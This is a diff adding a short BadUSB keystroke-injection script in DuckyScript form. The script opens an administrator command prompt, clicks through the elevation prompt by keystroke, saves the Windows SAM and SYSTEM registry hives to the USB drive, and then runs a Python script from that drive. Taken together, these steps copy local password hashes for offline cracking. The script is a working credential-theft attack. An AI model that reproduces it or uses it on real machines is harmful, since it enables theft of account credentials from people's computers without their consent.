@@ -1,0 +1,33 @@
+WINDOWS d
+DELAY 2000
+WINDOWS r
+DELAY 3000
+
+REM open terminal in admin mode
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 5000
+
+REM get past popup and press YES
+TAB
+TAB
+ENTER
+DELAY 5000
+		
+REM saving the sam directory to the usb drive
+STRING reg save HKLM\sam D:\sam.save
+ENTER
+
+REM saving the system directory to the usb drive, 
+STRING reg save HKLM\system D:\system.save
+ENTER	
+
+REM cd to badusb
+STRING cd /D D:\
+ENTER		
+		
+REM run python script on badusb
+STRING python3 printfilecontent.py
+ENTER
+	
+
